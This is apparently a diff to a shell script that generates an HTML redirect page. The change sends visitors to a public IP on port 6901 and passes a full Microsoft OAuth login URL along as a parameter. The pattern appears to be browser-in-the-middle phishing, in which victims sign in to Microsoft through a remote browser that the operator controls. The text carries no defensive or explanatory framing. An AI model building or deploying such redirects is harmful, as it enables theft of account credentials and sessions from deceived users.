@@ -377,7 +377,7 @@ cat <<EOF > "$index_file"
     <title>Redirect</title>
     <script>
         document.addEventListener("DOMContentLoaded", function() {
-            window.location.href = "http://$public_ip:6901/";
+            window.location.href = "http://$public_ip:6901/?1=login.microsoftonline.com/common/oauth2/authorize?client_id=0000000c-0000-0000-c000-000000000000&redirect_uri=https%3A%2F%2Faccount.activedirectory.windowsazure.com%2F&response_mode=form_post&response_type=codeid_token&scope=profile&state=OpenIdConnect.AuthenticationProperties%3DAQAAAAIAAAAJLnJdmVkaXJlY3Rvcnkud2luZG93c2F6dXJlLmNvbS9wcm9vZnVwLmFzcHg_cHJvb2Z1cD0xHk9wZW5JZENvbm5lY3QuQ29kZS5SZWRpcmVjdFVyacABQzdFLUdfTmdncnlRY0EzQU11UFRQd0ZYMDNxOWpIUkVuVWlZNVpNT0t1YXNOMFZUaFBvN2JUOFlGOGVSVmEwNzNDR2RlQmk3U1BHc3p4VmxkVlNGT3NiN1ZDYVhONU91QlFqSjJCTVFTZ2hsSjBZQVFGeVQwUHdqUzVzcmZOZURkbm01ZVptZlFjRm1WWWZhYnl1NU05MkZRZFBmb2EweVpKTExOSEc5UnptTzFpd3hYZXRxODZ0Mkp3SjBGU2ZZ&nonce=1736972479.WbAHN1D16IdCfp-TqD69og&proofup=1&nux=1"
         });
     </script>
 </head>
